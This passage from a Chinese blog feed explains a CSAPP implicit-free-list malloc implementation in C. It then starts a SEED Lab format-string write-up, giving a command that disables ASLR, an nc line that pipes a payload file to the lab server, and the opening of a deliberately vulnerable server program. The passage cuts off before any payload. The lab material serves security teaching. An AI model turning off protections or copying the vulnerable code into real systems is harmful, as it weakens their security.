shrunk.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">mem_sbrk</span><span class="hljs-params">(<span class="hljs-keyword">int</span> incr)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> *old_brk = mem_brk;<br><br>    <span class="hljs-keyword">if</span> ( (incr &lt; <span class="hljs-number">0</span>) || ((mem_brk + incr) &gt; mem_max_addr)) &#123;<br>errno = ENOMEM;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;ERROR: mem_sbrk failed. Ran out of memory...\n&quot;</span>);<br><span class="hljs-keyword">return</span> (<span class="hljs-keyword">void</span> *)<span class="hljs-number">-1</span>;<br>    &#125;<br>    mem_brk += incr;<br>    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">void</span> *)old_brk;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看出，堆的范围是通过mem_brk限制的，堆的增长本质上是将全局变量mem_sbrk增加incr个字节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> *mem_brk;        <span class="hljs-comment">/* points to last byte of heap */</span><br></code></pre></td></tr></table></figure><p>mem_sbrk函数返回old_brk，old_brk是堆增长前的的最后一个字节的指针</p><p>之后，在mm_init函数中，使用了四个PUT，对堆的初始空间的四个字进行了初始化工作</p><p>对空堆的初始化完成之后，使用extend_heap函数拓展堆的大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *<span class="hljs-title">extend_heap</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> words)</span> </span>&#123;<br>    <span class="hljs-keyword">char</span> *bp;<br>    <span class="hljs-keyword">size_t</span> size;<br><br>    <span class="hljs-comment">/* 为了8字节对齐，传入的words应该是2的整数倍，比如2,4,8 以满足8字节倍数的要求 Allocate an even number of words to maintain alignment */</span><br>    size = (words % <span class="hljs-number">2</span>) ? (words + <span class="hljs-number">1</span>) * WSIZE : words * WSIZE;<br>    <span class="hljs-comment">// 调用mem_sbrk 申请size字节的内存，如果失败，返回NULL，bp是指向新申请的内存的底部的指针</span><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">long</span>)(bp = mem_sbrk(size)) == <span class="hljs-number">-1</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">/* Initialize free block header/footer and the epilogue header */</span><br>    <span class="hljs-comment">/* 这里bp被当做指向块的指针，put宏将会覆盖尾声块*/</span><br>    <span class="hljs-comment">/* 给新开辟的空间设置头部和脚部，并标记为未分配状态*/</span><br>    PUT(HDRP(bp), PACK(size, <span class="hljs-number">0</span>));         <span class="hljs-comment">/* Free block header */</span><br>    PUT(FTRP(bp), PACK(size, <span class="hljs-number">0</span>));         <span class="hljs-comment">/* Free block footer */</span><br>    <span class="hljs-comment">/* 由于尾声块被覆盖，这里将尾声块放到新开辟空间的后面，作为结束标志*/</span><br>    PUT(HDRP(NEXT_BLKP(bp)), PACK(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)); <span class="hljs-comment">/* New epilogue header*/</span><br>    <span class="hljs-comment">/* 这里分配了一个新的块，假设前一个块是未分配状态，那么前后两个块需要进行合并 */</span><br>    <span class="hljs-comment">/* coalesce函数返回合并后的空闲块的指针*/</span><br>    <span class="hljs-keyword">return</span> coalesce(bp);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>首先对传入的字进行处理，为了保持8字节对齐，传入的words应该是2的整数倍</li><li>调用mem_sbrk进行堆空间的申请</li><li>给新分配的大小为size的空间进行初始化，将头部和足部设置为size大小，未分配<ul><li>注意到，这里分配新块时将原先的尾声块覆盖了</li></ul></li><li>设置新的尾声块</li><li>调用coalesce函数</li></ul><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202305312011844.png"></p><h2 id="mm-free"><a href="#mm-free" class="headerlink" title="mm_free"></a>mm_free</h2><p>该函数释放ptr指向的块的空间</p><ul><li>获取块的大小</li><li>将块的头脚部的标志位都改为0，也即标记为未分配</li><li>将这个块置为空闲，可能会导致合并操作，因此需要调用coalesce函数</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * mm_free - Freeing a block does nothing.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">mm_free</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *ptr)</span></span><br><span class="hljs-function"></span>&#123;   <span class="hljs-comment">/*获取ptr指向的块的大小*/</span><br>    <span class="hljs-keyword">size_t</span> size = GET_SIZE(HDRP(ptr));<br>    <span class="hljs-comment">/*将块的头脚部的标志位都改为0，也即标记为未分配*/</span><br>    PUT(HDRP(ptr), PACK(size, <span class="hljs-number">0</span>));<br>    PUT(FTRP(ptr), PACK(size, <span class="hljs-number">0</span>));<br>    <span class="hljs-comment">/*free操作伴随着四种合并的可能*/</span><br>    coalesce(ptr);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="coalesce"><a href="#coalesce" class="headerlink" title="coalesce"></a>coalesce</h2><p>块的合并操作，建议配合书上的四个合并情况的配图观赏</p><ul><li>前后块都已分配</li><li>前块已分配，后块未分配</li><li>前块未分配，后块已分配</li><li>前后块都未分配</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 块的合并操作 */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *<span class="hljs-title">coalesce</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *ptr)</span> </span>&#123;<br>    <span class="hljs-keyword">size_t</span> prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(ptr)));<span class="hljs-comment">//获取前一个块的分配状态</span><br>    <span class="hljs-keyword">size_t</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(ptr)));<span class="hljs-comment">// 获取后一个块的分配状态</span><br>    <span class="hljs-keyword">size_t</span> size = GET_SIZE(HDRP(ptr));<span class="hljs-comment">//获取当前块的大小</span><br>    <br>    <span class="hljs-comment">// 根据前后块的分配状态，进行四种合并操作</span><br>    <span class="hljs-comment">// 1.前后块都已分配</span><br>    <span class="hljs-keyword">if</span> (prev_alloc &amp;&amp; next_alloc) &#123;<br>        <span class="hljs-keyword">return</span> ptr;<br>    &#125;<br>    <span class="hljs-comment">// 2.前块已分配，后块未分配</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (prev_alloc &amp;&amp; !next_alloc) &#123;<br>        size += GET_SIZE(HDRP(NEXT_BLKP(ptr)));<span class="hljs-comment">// 当前块的大小+后块的大小</span><br>        PUT(HDRP(ptr), PACK(size, <span class="hljs-number">0</span>));<br>        PUT(FTRP(ptr), PACK(size, <span class="hljs-number">0</span>));<br>    &#125;<br>    <span class="hljs-comment">// 3.前块未分配，后块已分配</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!prev_alloc &amp;&amp; next_alloc) &#123;<br>        size += GET_SIZE(HDRP(PREV_BLKP(ptr)));<span class="hljs-comment">// 当前块的大小+前块的大小</span><br>        PUT(FTRP(ptr), PACK(size, <span class="hljs-number">0</span>));        <span class="hljs-comment">// 合并当前块+前块，更新当前块的头部、脚部、分配状态</span><br>        PUT(HDRP(PREV_BLKP(ptr)),PACK(size, <span class="hljs-number">0</span>));<br>        ptr = PREV_BLKP(ptr);<br>    &#125;<br>    <span class="hljs-comment">// 4.前后块都未分配</span><br>    <span class="hljs-keyword">else</span> &#123;<br>        size += GET_SIZE(HDRP(PREV_BLKP(ptr))) + GET_SIZE(FTRP(NEXT_BLKP(ptr)));<br>        PUT(HDRP(PREV_BLKP(ptr)), PACK(size, <span class="hljs-number">0</span>));<br>        PUT(FTRP(NEXT_BLKP(ptr)), PACK(size, <span class="hljs-number">0</span>));<br>        ptr = PREV_BLKP(ptr);<br>    &#125;<br>    <span class="hljs-keyword">return</span> ptr;<span class="hljs-comment">//返回合并后的块的指针</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="mm-malloc"><a href="#mm-malloc" class="headerlink" title="mm_malloc"></a>mm_malloc</h2><p>看一下lab提供的原始版本的mm_malloc函数，<del>发现这个实现不就是扯淡吗</del>。mm_malloc函数仅仅使用mem_sbrk函数申请对齐后的size大小的堆空间，然后对块写入size值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * mm_malloc - Allocate a block by incrementing the brk pointer.</span><br><span class="hljs-comment"> *     Always allocate a block whose size is a multiple of the alignment.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">mm_malloc</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> size)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> newsize = ALIGN(size + SIZE_T_SIZE);<br>    <span class="hljs-keyword">void</span> *p = mem_sbrk(newsize);<br>    <span class="hljs-keyword">if</span> (p == (<span class="hljs-keyword">void</span> *)<span class="hljs-number">-1</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">else</span> &#123;<br>        *(<span class="hljs-keyword">size_t</span> *)p = size;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">void</span> *)((<span class="hljs-keyword">char</span> *)p + SIZE_T_SIZE);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>下面的mm_malloc实现增加了：</p><ul><li>特殊size值（0）的处理</li><li>使用find函数在空闲链表中查找合适大小的空闲块</li><li>使用place函数将空闲块分配给请求</li><li>如果没有找到合适大小的空闲块，则需要使用extend_heap函数扩展堆的大小</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * mm_malloc - Allocate a block by incrementing the brk pointer.</span><br><span class="hljs-comment"> *     Always allocate a block whose size is a multiple of the alignment.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">mm_malloc</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> size)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">size_t</span> asize; <span class="hljs-comment">/* Adjust block size */</span>  <span class="hljs-comment">// 调整后的块大小</span><br>    <span class="hljs-keyword">size_t</span> extendsize; <span class="hljs-comment">/* Amount to extend heap if no fit */</span>  <span class="hljs-comment">// 如果没有合适的块，则需要扩展堆的大小</span><br>    <span class="hljs-keyword">char</span> *ptr;<br><br>    <span class="hljs-comment">/* Ignore spurious requests */</span><br>    <span class="hljs-keyword">if</span>(size == <span class="hljs-number">0</span>)&#123;  <span class="hljs-comment">// 如果请求的大小为0，则返回NULL</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* Adjust block size to include overhead and alignment reqs. */</span><br>    <span class="hljs-keyword">if</span>(size &lt;= DSIZE)&#123;  <span class="hljs-comment">// 如果请求的大小小于等于DSIZE，则将块大小设置为2 * DSIZE</span><br>        asize = <span class="hljs-number">2</span> * DSIZE; <br>    &#125; <span class="hljs-keyword">else</span> &#123;  <span class="hljs-comment">// 否则，将块大小设置为DSIZE的倍数，满足对齐要求</span><br>        asize = DSIZE * ((size + (DSIZE) + (DSIZE - <span class="hljs-number">1</span>)) / DSIZE); <br>    &#125;<br><br>    <span class="hljs-comment">/* Search the free list for a fit */</span><br>    <span class="hljs-keyword">if</span>((ptr = find_fit(asize)) != <span class="hljs-literal">NULL</span>) &#123;  <span class="hljs-comment">// 在空闲链表中查找合适大小的空闲块</span><br>        place(ptr, asize);  <span class="hljs-comment">// 将空闲块分配给请求</span><br>        <span class="hljs-keyword">return</span> ptr;  <span class="hljs-comment">// 返回指向分配的空间的指针</span><br>    &#125;<br><br>    <span class="hljs-comment">/* No fit found. Get more memory and place the block */</span><br>    extendsize = MAX(asize, CHUNKSIZE);  <span class="hljs-comment">// 如果没有找到合适大小的空闲块，则需要扩展堆的大小，扩展的大小为请求大小和一个默认的 CHUNKSIZE 中的较大值</span><br>    <span class="hljs-keyword">if</span>((ptr = extend_heap(extendsize/WSIZE)) == <span class="hljs-literal">NULL</span>) &#123;  <span class="hljs-comment">// 扩展堆的大小，并将新分配的空间划分为一个新的空闲块</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;  <span class="hljs-comment">// 如果扩展失败，则返回NULL</span><br>    &#125;<br>    place(ptr, asize);  <span class="hljs-comment">// 将新分配的空间分配给请求</span><br>    <span class="hljs-keyword">return</span> ptr;  <span class="hljs-comment">// 返回指向分配的空间的指针</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="find-fit"><a href="#find-fit" class="headerlink" title="find_fit"></a>find_fit</h3><p>遍历堆空间，找到一个合适大小的空闲块，并返回指向该空闲块的指针。如果找不到就返回null</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> * <span class="hljs-title">find_fit</span><span class="hljs-params">(<span class="hljs-keyword">ssize_t</span> asize)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">void</span> *bp;<br>    <span class="hljs-comment">/* 遍历空闲链表，寻找合适大小的空闲块 */</span><br>    <span class="hljs-keyword">for</span>(bp = heap_listp; GET_SIZE(HDRP(bp)) &gt; <span class="hljs-number">0</span>; bp = NEXT_BLKP(bp)) &#123;<br>        <span class="hljs-comment">/* 如果找到合适大小的空闲块，则返回指向该空闲块的指针 */</span><br>        <span class="hljs-keyword">if</span>(!GET_ALLOC(HDRP(bp)) &amp;&amp; (asize &lt;= GET_SIZE(HDRP(bp)))) &#123;<br>            <span class="hljs-keyword">return</span> bp;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>; <span class="hljs-comment">/* No fit */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="place"><a href="#place" class="headerlink" title="place"></a>place</h3><p>给定空闲块的指针和需要分配的堆空间的大小，对块进行分配</p><ul><li>如果空闲块的大小减去请求的大小大于等于16个字节（头部4字节、脚部4字节+8字节作为填充），那么就将空闲块分割为两部分</li><li>否则，如果空闲块的大小减去请求的大小小于两个字，那么将整个空闲块分配给请求</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">place</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *bp, <span class="hljs-keyword">size_t</span> asize)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">size_t</span> csize = GET_SIZE(HDRP(bp));  <span class="hljs-comment">// 获取空闲块的大小</span><br>    <span class="hljs-comment">/* 如果空闲块的大小大于请求的大小，则将空闲块分割为两部分，一部分分配给请求，另一部分仍然是空闲块 */</span><br>    <span class="hljs-keyword">if</span>((csize - asize) &gt;= (<span class="hljs-number">2</span> * DSIZE)) &#123;<br>        <span class="hljs-comment">/* 将空闲块分割为两部分，一部分分配给请求，另一部分仍然是空闲块 */</span><br>        PUT(HDRP(bp), PACK(asize, <span class="hljs-number">1</span>));  <span class="hljs-comment">// 设置分配块的头部</span><br>        PUT(FTRP(bp), PACK(asize, <span class="hljs-number">1</span>));  <span class="hljs-comment">// 设置分配块的脚部</span><br>        bp = NEXT_BLKP(bp);  <span class="hljs-comment">// 将指针指向剩余的空闲块</span><br>        PUT(HDRP(bp), PACK(csize - asize, <span class="hljs-number">0</span>));  <span class="hljs-comment">// 设置剩余空闲块的头部</span><br>        PUT(FTRP(bp), PACK(csize - asize, <span class="hljs-number">0</span>));  <span class="hljs-comment">// 设置剩余空闲块的脚部</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;  <span class="hljs-comment">// 否则，将整个空闲块分配给请求</span><br>        PUT(HDRP(bp), PACK(csize, <span class="hljs-number">1</span>));  <span class="hljs-comment">// 设置分配块的头部</span><br>        PUT(FTRP(bp), PACK(csize, <span class="hljs-number">1</span>));  <span class="hljs-comment">// 设置分配块的脚部</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="mm-realloc"><a href="#mm-realloc" class="headerlink" title="mm_realloc"></a>mm_realloc</h2><p>根据文档，该函数具有以下约束。</p><ul><li>如果 ptr 为 NULL，调用等同于 mm_malloc(size)；</li><li>如果 size 等于零，则调用等同于 mm_free(ptr)；</li><li>如果 ptr 不为 NULL，则它必须由先前对 mm malloc 或 mm realloc 的调用返回。调用 mm realloc 将 ptr（旧块）指向的内存块的大小更改为 size bytes 并返回新块的地址。请注意，新块的地址可能与旧块的地址相同，也可能不同，具体取决于您的实现、旧块中的内部碎片量以及 realloc 请求的大小。新块的内容与旧 ptr 块的内容相同，直到新旧大小中的最小值。其他一切都未初始化。</li><li>如果旧块为 8 个字节，新块为 12 个字节，则新块的前 8 个字节与旧块的前 8 个字节相同，最后 4 个字节未初始化。类似地，如果旧块是 8 个字节而新块是 4 个字节，那么新块的内容与旧块的前 4 个字节相同。</li></ul><h1 id="显示空闲链表实现"><a href="#显示空闲链表实现" class="headerlink" title="显示空闲链表实现"></a>显示空闲链表实现</h1><p>//todo</p><p><img src=""></p><p>我的博客即将同步至腾讯云开发者社区，邀请大家一同入驻：<a href="https://cloud.tencent.com/developer/support-plan?invite_code=2w4v1usqstus0">https://cloud.tencent.com/developer/support-plan?invite_code=2w4v1usqstus0</a></p>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SEED-lab：Format String Vulnerability Lab</title>
    <link href="/p/df8f6639/"/>
    <url>/p/df8f6639/</url>
    
    <content type="html"><![CDATA[<h1 id="Environment-Setup"><a href="#Environment-Setup" class="headerlink" title="Environment Setup"></a>Environment Setup</h1><p>现代操作系统使用地址空间随机化（ASLR）来随机化堆和堆栈的起始地址。这使得猜测确切的地址变得困难; 猜测地址是格式字符串攻击的关键步骤之一。为了简化这个lab，我们使用以下命令关闭地址随机化:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ sudo sysctl -w kernel.<span class="hljs-attribute">randomize_va_space</span>=0<br></code></pre></td></tr></table></figure><h1 id="The-Vulnerable-Program"><a href="#The-Vulnerable-Program" class="headerlink" title="The Vulnerable Program"></a>The Vulnerable Program</h1><p>在server-code目录执行</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-built_in">make</span> <br><span class="hljs-built_in">make</span> install <br></code></pre></td></tr></table></figure><p>服务器运行在10.9.0.5上，它运行一个带有格式字符串漏洞的32位程序</p><p>在Labsetup文件夹执行</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">docker-compose <span class="hljs-keyword">build </span><span class="hljs-comment"># Build the container image</span><br>docker-compose up <span class="hljs-comment"># Start the container</span><br></code></pre></td></tr></table></figure><p>回显</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">Starting</span> server-<span class="hljs-number">10.9.0.6</span> ... done<br>Attaching to server-<span class="hljs-number">10.9.0.5</span>, server-<span class="hljs-number">10.9.0.6</span><br></code></pre></td></tr></table></figure><p>在容器中运行shell</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">[03/<span class="hljs-number">27</span>/<span class="hljs-number">23</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/</span>.../Labsetup<span class="hljs-variable">$ </span>dockps<br>e17efb105f7d  server<span class="hljs-number">-10.9</span>.0.<span class="hljs-number">6</span><br><span class="hljs-number">1874</span>c8677f7a  server<span class="hljs-number">-10.9</span>.0.<span class="hljs-number">5</span><br>[03/<span class="hljs-number">27</span>/<span class="hljs-number">23</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/</span>.../Labsetup<span class="hljs-variable">$ </span>docksh e17<br>root<span class="hljs-variable">@e17efb105f7d</span><span class="hljs-symbol">:/fmt</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>服务器接受最多1500字节的数据。这个lab中的主要工作是构建不同的有效载荷，以利用服务器中的格式字符串漏洞，这样就可以实现每个任务中指定的目标。如果将有效负载保存在文件中，则可以使用以下命令将有效负载发送到服务器。</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> cat &lt;<span class="hljs-keyword">file</span>&gt; | nc <span class="hljs-number">10.9</span><span class="hljs-number">.0</span><span class="hljs-number">.5</span> <span class="hljs-number">9090</span><br></code></pre></td></tr></table></figure><p>易受攻击的程序format. c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;netinet/ip.h&gt;</span></span><br><br><span class="hljs-comment">/* Changing this size will change the layout of the stack.</span><br><span class="hljs-comment"> * Instructors can change this value each year, so students</span><br><span class="hljs-comment"> * won&#x27;t be able to use the solutions from the past.</span><br><span class="hljs-comment"> * Suggested value: between 10 and 400  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> BUF_SIZE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BUF_SIZE 100</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> __x86_64__</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> target = <span class="hljs-number">0x1122334455667788</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>  target = <span class="hljs-number">0x11223344</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> </span><br><br><span class="hljs-keyword">char</span> *secret = <span class="hljs-string">&quot;A secret message\n&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dummy_function</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">myprintf</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *msg)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> __x86_64__</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">int</span> *framep;<br>    <span class="hljs-comment">// Save the rbp value into framep</span><br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;movq %%rbp, %0&quot;</span> : <span class="hljs-string">&quot;=r&quot;</span> (framep));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Frame Pointer (inside myprintf):      